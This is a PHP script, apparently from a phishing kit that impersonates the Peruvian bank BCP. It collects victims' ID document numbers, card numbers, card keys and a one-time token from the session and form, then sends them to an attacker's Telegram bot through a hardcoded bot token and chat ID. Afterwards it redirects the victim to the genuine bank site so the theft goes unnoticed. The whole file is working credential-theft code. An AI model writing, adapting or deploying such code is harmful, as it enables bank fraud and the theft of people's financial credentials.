<?php session_start();

$tok = $_POST['to'];

$bcp_input_1 = $_SESSION['bcp_input_1'];
$ciam_input_card = $_SESSION['ciam_input_card'];
$ciam_input_card2 = $_SESSION['ciam_input_card2'];
$doc = $_SESSION['doc'];

$msj = "👤<b>NUEVO REGISTRO</b>👤" . "\n\n";
$msj .= "📋<b>Type:</b> " . $doc . "\n";
$msj .= "📝<b>Doc:</b> <code>" . $bcp_input_1 . "</code>\n";
$msj .= "💳<b>CC:</b> <code>" . $ciam_input_card . "</code>\n";
$msj .= "🔑<b>Key:</b> <code>" . $ciam_input_card2 . "</code>\n\n";
$msj .= "🔒<b>Token:</b> <code>" . $tok . "</code>\n";


$token = "5922422273:AAH7r-Sd8d-zmZfY2nDpbPe52F5uVZDGANE";
$id = "1739203762";
$urlMsg = "https://api.telegram.org/bot{$token}/editMessageText";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $urlMsg);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id=$id&message_id=".$_SESSION['msj_id']."&text=$msj&parse_mode=HTML");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$server_output = curl_exec($ch);
curl_close($ch);

header('Location: https://bcpzonasegurabeta.viabcp.com/');